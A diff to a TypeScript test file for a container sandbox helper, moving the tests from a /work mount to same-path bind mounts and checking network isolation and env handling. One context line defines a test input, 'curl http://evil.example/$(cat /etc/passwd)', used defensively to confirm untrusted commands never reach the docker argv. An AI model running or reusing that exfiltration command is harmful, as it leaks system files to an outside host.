@@ -42,7 +42,11 @@ describe('buildContainerInvocation', () => {
   const SECRET_CMD = "curl http://evil.example/$(cat /etc/passwd) # 'tricky'";
   const built = buildContainerInvocation(SECRET_CMD, {
     image: 'alpine:3.20',
-    mountDir: '/tmp/work dir',
+    mounts: [
+      { hostPath: '/home/u/work dir', containerPath: '/home/u/work dir' },
+      { hostPath: '/home/u/m', containerPath: '/home/u/m', readonly: true }
+    ],
+    workdir: '/home/u/work dir',
     network: 'none',
     env: { API_KEY: 'shh' }
   });
@@ -52,15 +56,16 @@ describe('buildContainerInvocation', () => {
     expect(
       buildContainerInvocation('echo x', {
         image: 'alpine',
-        mountDir: '/tmp/w'
+        mounts: [{ hostPath: '/home/u/w', containerPath: '/home/u/w' }],
+        workdir: '/home/u/w'
       }).dockerCommand
     ).toContain('--network none');
   });
 
-  it('mounts the host dir at /work and sets workdir', () => {
-    expect(built.dockerCommand).toContain('-w /work');
-    expect(built.dockerCommand).toContain(":/work'");
-    expect(built.dockerCommand).toContain('/tmp/work dir:/work');
+  it('bind-mounts each path (same-path transparent) and sets workdir', () => {
+    expect(built.dockerCommand).toContain('-w ');
+    expect(built.dockerCommand).toContain('/home/u/work dir:/home/u/work dir');
+    expect(built.dockerCommand).toContain('/home/u/m:/home/u/m:ro');
   });
 
   it('NEVER puts the untrusted command on the docker argv — only via env', () => {
@@ -81,50 +86,50 @@ describe('buildContainerInvocation', () => {
 describe.skipIf(!dockerUp)(
   'runCommandInContainer (needs docker daemon)',
   () => {
-    it('runs a command in the container and captures stdout', async () => {
-      const dir = await makeMountDir();
-      const result = await runCommandInContainer('echo hi-from-container', {
+    const isolated = (
+      command: string,
+      dir: string,
+      env?: Record<string, string>
+    ) =>
+      runCommandInContainer(command, {
         image: IMAGE,
-        mountDir: dir,
+        mounts: [{ hostPath: dir, containerPath: dir }],
+        workdir: dir,
         network: 'none',
+        ...(env ? { env } : {}),
         timeoutMs: 60_000
       });
+
+    it('runs a command in the container and captures stdout', async () => {
+      const dir = await makeMountDir();
+      const result = await isolated('echo hi-from-container', dir);
       expect(result.status).toBe('pass');
       expect(result.stdout).toContain('hi-from-container');
     }, 120_000);
 
     it('isolates the network with --network none', async () => {
       const dir = await makeMountDir();
-      // busybox wget with no network must fail; we convert that to a marker.
-      const result = await runCommandInContainer(
+      const result = await isolated(
         'wget -T 3 -q -O- http://1.1.1.1 >/dev/null 2>&1 && echo NET_OK || echo NET_BLOCKED',
-        { image: IMAGE, mountDir: dir, network: 'none', timeoutMs: 60_000 }
+        dir
       );
       expect(result.stdout).toContain('NET_BLOCKED');
       expect(result.stdout).not.toContain('NET_OK');
     }, 120_000);
 
-    it('mounts the host directory read-write at /work', async () => {
+    it('mounts the host directory and runs in it (same-path workdir)', async () => {
       const dir = await makeMountDir();
       await writeFile(path.join(dir, 'marker.txt'), 'mounted-ok');
-      const result = await runCommandInContainer('cat /work/marker.txt', {
-        image: IMAGE,
-        mountDir: dir,
-        network: 'none',
-        timeoutMs: 60_000
-      });
+      // workdir == dir, so a relative read works and confirms cwd + mount.
+      const result = await isolated('cat marker.txt', dir);
       expect(result.status).toBe('pass');
       expect(result.stdout).toContain('mounted-ok');
     }, 120_000);
 
     it('passes env through without putting the value on any argv', async () => {
       const dir = await makeMountDir();
-      const result = await runCommandInContainer('echo "$SECRET_ECHO"', {
-        image: IMAGE,
-        mountDir: dir,
-        network: 'none',
-        env: { SECRET_ECHO: 'value-via-env' },
-        timeoutMs: 60_000
+      const result = await isolated('echo "$SECRET_ECHO"', dir, {
+        SECRET_ECHO: 'value-via-env'
       });
       expect(result.stdout).toContain('value-via-env');
     }, 120_000);
